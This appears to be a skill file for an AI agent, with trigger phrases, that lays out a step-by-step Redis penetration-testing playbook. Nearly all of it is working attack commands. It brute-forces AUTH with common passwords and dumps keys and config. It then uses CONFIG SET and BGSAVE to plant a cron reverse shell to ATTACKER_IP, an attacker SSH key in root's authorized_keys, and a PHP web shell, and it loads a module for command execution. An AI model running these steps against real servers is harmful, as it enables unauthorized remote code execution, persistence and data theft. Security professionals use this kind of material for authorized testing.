---
name: tech-redis
description: "Redis security testing — unauthenticated access, AUTH brute force, config write for cron/SSH injection, Lua RCE, Redis module exploitation. Triggers: 'redis', 'redis security', 'redis pentest', 'redis unauth', 'redis rce', 'redis cron', 'redis ssh', 'redis exploit', 'redis config write'."
---

# Redis Security Testing

Exploit unauthenticated Redis for configuration-based RCE.

---

## Phase 1: Discovery & Authentication Test

```bash
TARGET="TARGET_IP"

nmap -p 6379 -sV "$TARGET" 2>/dev/null
nc -nv "$TARGET" 6379 << 'EOF'
PING
INFO
EOF

redis-cli -h "$TARGET" PING 2>/dev/null && echo "UNAUTHENTICATED ACCESS!"
redis-cli -h "$TARGET" INFO server 2>/dev/null | tee output/redis_info.txt

for PASS in "" "redis" "admin" "password" "root" "123456" "test" "default"; do
  RESULT=$(redis-cli -h "$TARGET" -a "$PASS" PING 2>/dev/null)
  [ "$RESULT" == "PONG" ] && echo "VALID PASSWORD: '$PASS'"
done | tee output/redis_auth.txt
```

---

## Phase 2: Information Gathering

```bash
TARGET="TARGET_IP"

REDIS_CMD="redis-cli -h $TARGET"

$REDIS_CMD INFO all 2>/dev/null | tee output/redis_info_full.txt

$REDIS_CMD KEYS "*" 2>/dev/null | head -50 | tee output/redis_keys.txt

for KEY in $($REDIS_CMD KEYS "*" 2>/dev/null | head -20); do
  TYPE=$($REDIS_CMD TYPE "$KEY" 2>/dev/null)
  echo "=== $KEY ($TYPE) ==="
  case "$TYPE" in
    string) $REDIS_CMD GET "$KEY" ;;
    hash)   $REDIS_CMD HGETALL "$KEY" ;;
    list)   $REDIS_CMD LRANGE "$KEY" 0 10 ;;
    set)    $REDIS_CMD SMEMBERS "$KEY" ;;
  esac
done 2>/dev/null | tee output/redis_dump.txt

$REDIS_CMD CONFIG GET "*" 2>/dev/null | tee output/redis_config.txt
```

---

## Phase 3: RCE via Config Write

```bash
TARGET="TARGET_IP"

redis-cli -h "$TARGET" CONFIG SET dir /var/spool/cron/ 2>/dev/null
redis-cli -h "$TARGET" CONFIG SET dbfilename "root" 2>/dev/null
redis-cli -h "$TARGET" SET crontab "\n\n*/1 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n" 2>/dev/null
redis-cli -h "$TARGET" BGSAVE 2>/dev/null

redis-cli -h "$TARGET" CONFIG SET dir /root/.ssh/ 2>/dev/null
redis-cli -h "$TARGET" CONFIG SET dbfilename "authorized_keys" 2>/dev/null
SSH_PUB="ssh-rsa AAAA... your_key"
redis-cli -h "$TARGET" SET sshkey "\n\n${SSH_PUB}\n\n" 2>/dev/null
redis-cli -h "$TARGET" BGSAVE 2>/dev/null

redis-cli -h "$TARGET" CONFIG SET dir /var/www/html/ 2>/dev/null
redis-cli -h "$TARGET" CONFIG SET dbfilename "shell.php" 2>/dev/null
redis-cli -h "$TARGET" SET webshell "<?php system(\$_GET['cmd']); ?>" 2>/dev/null
redis-cli -h "$TARGET" BGSAVE 2>/dev/null
```

---

## Phase 4: Redis Lua RCE (if eval enabled)

```bash
TARGET="TARGET_IP"

redis-cli -h "$TARGET" EVAL "return redis.call('INFO')" 0 2>/dev/null | head -5

redis-cli -h "$TARGET" MODULE LIST 2>/dev/null

redis-cli -h "$TARGET" MODULE LOAD /tmp/module.so 2>/dev/null
redis-cli -h "$TARGET" system.exec "id" 2>/dev/null
```

---

## Output

Save to `output/`:
- `redis_info.txt` — server information
- `redis_keys.txt` — all keys found
- `redis_dump.txt` — key contents

## Next Phase

→ `post-linux-privesc` after gaining shell via cron injection
→ `pentest-report` to document Redis misconfiguration
